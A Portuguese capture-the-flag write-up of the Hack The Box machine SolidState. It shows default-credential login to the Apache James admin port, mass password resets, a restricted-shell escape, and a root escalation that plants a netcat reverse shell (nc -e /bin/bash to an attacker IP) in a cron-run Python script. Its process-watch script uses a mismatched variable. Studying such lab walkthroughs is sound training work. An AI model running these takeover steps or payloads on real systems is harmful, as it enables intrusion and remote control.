---
title: "Hack The Box - SolidState"
tags: [Linux,Medium,Gobuster,PSPY]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/85>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_nmap.png)

Vamos rodar nmap full ports também, pois a porta a ser explorada não está listada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_nmap1.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 6 portas abertas no servidor

> Porta 22 -> Servidor SSH, dificilmente a exploração vai ser por aqui

> Porta 25 -> Servidor SMTP

> Porta 110 -> Servidor POP3

> Porta 119 -> Servidor NNTP

> Porta 80 -> Servidor Web.

> Porta 4555 -> Serviço não identificado

## Enumeração da porta 80

Abrimos o browser no endereço e encontramos a seguinte página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_web.png)

### Gobuster

Rodamos o Gobuster na página, mas não encontramos nada de importante

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_gobuster.png)

## Enumeração James Mail Server

James Mail Server está sendo executado em 4 diferentes portas com diferentes funções. SMTP na porta 25 TCP, POP3 porta 110 TCP, NNTP porta 119 TCP e a porta 4555.

Até agora não encontramos nada que possa ser explorado nas outras portas, então vamos para a 4555

Tentamos login com `root:root` e deu certo!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_j.png)

O que podemos fazer aqui?

Com o `help` conseguimos a lista de comandos que podemos executar na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_j1.png)

Podemos listar todos os Usuários da aplicação

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_j2.png)

Podemos trocar a senha de todos os usuários também! Vamos fazer isso

```setpassword user senha```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_j3.png)

Pronto! Todas as senhas agora são 123

Vamos abrir e-mail por e-mail para ver se encontramos algo interessante

Vamos fazer isso de duas maneiras, uma delas através da linha de comando, a outra através do `Thunderbird`

### Linha de comando

Vamos verificar os e-mail de `james`, vimos que não tem nada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_j4.png)

Vamos verificar do usuário `thomas`, nada também

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_j5.png)

Vamos verificar do usuário `john`, e tem uma mensagem

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_j6.png)

Com o comando `RETR msg` lemos o e-mail

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_j7.png)

Aqui diz que a usuário mindy tem acesso ao servidor, de qualquer modo ela era a próxima a ser verificada

Verificando usuário `mindy`, encontramos uma credencial

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_j8.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_j9.png)

```
username: mindy
pass: P@55W0rd1!2@
```

### Através do Thunderbird

O Thunderbird faz a mesma coisa, só que por uma interface gráfica

Abrimos ele. Na página inicial clicamos em `E-mail`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_t.png)

Preenchemos conforme a senha que foi trocada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_t1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_t2.png)

Lemos o e-mail

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_t3.png)

Há diversas outras ferramentas que fazem isso. Qualquer leitor de e-mail da certo. Evolution também da certo, por exemplo

Mas vamos prosseguir

# Exploração

## Acesso SSH

Uma vez que sabemos que há um servidor SSH na máquina, vamos tentar entrar nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_ssh.png)

### Restricted Bash

Ao entrarmos na máquina, percebemos que temos um shell restrito, com apenas alguns comandos, há várias maneiras de se driblar isso, vou demonstrar algumas

#### 1º SSH '-t bash' ou '--noprofile'

Com o SSH nós podemos indicar qual tipo de bash querermos com a flag -t, então fica fácil ter um shell melhorado, também poderiamos indicar que não queremos nenhum profile

> ssh mindy@10.10.10.51 -t bash

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_ssh1.png)

> ssh mindy@10.10.10.51 'bash --noprofile'

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_ssh2.png)

#### Através da exploração do James

Outro modo, creio que o pensado pelo criador da máquina é através exploração do James

Uma breve pesquisada por exploits encontramos alguns que nos interessam e muito

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_search.png)

Iremos utilizar o Apache James Server 2.3.2 - Remote Command Execution

Puxamos ele para nossa pasta de trabalho

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_search1.png)

Verificamos como ele funciona e alteramos os parâmetros necessários para ele funcionar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_search3.png)

Abrimos o listener, executamos o exploit, logamos no SSH e recebemos a shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_bash.png)

# Escalação de privilégio

Vamos rodar o LinPeas na máquina para verificar pontos de escalação de privilégio

> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_linpeas.png)

Passamos pra máquina e rodamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_linpeas1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_linpeas2.png)

Encontramos dentro da pasta /opt um script em Python com chmod 777 habilitado... show de bola

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_tmp.png)

Vamos ver se ele está sendo executado, pq senão não adianta

Pra verificar os processos que estão sendo executados iremos realizar de dois modos

### 1º PSPY

Pra verificar os processos irei utilizar o `pspy`

> https://github.com/DominicBreuker/pspy

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_pspy.png)

Passamos para máquina e executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_pspy1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_pspy2.png)

Verificamos que tem uma cronjob sim de root!

### 2º Script Manual

Com esse script simples, manual, podemos também verificar quais processos estão sendo executados como root

```
IFS=$'\n'
op=$(ps -eo command)
while true; do
    novo_processo=$(ps -eo command)
    diff <(echo "$op") <(echo "$np")
    sleep .2
    op=$np
done
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_proc.png)

Executamos, esperamos e ai está

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_proc1.png)

## Explorando o tmp.py

Agora ficou fácil de conseguirmos um shell de root

Acrescentamos no tmp.py o seguinte código:

```
#!/usr/bin/env python
import os
import sys
try:
     os.system('/bin/nc -e /bin/bash 10.10.16.119 443')
except:
     sys.exit()
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_tmp1.png)

Ligamos o Listener, esperamos 3 minutos e somos root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_tmp2.png)

## Pegamos flag de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-solidstate/S_user.png)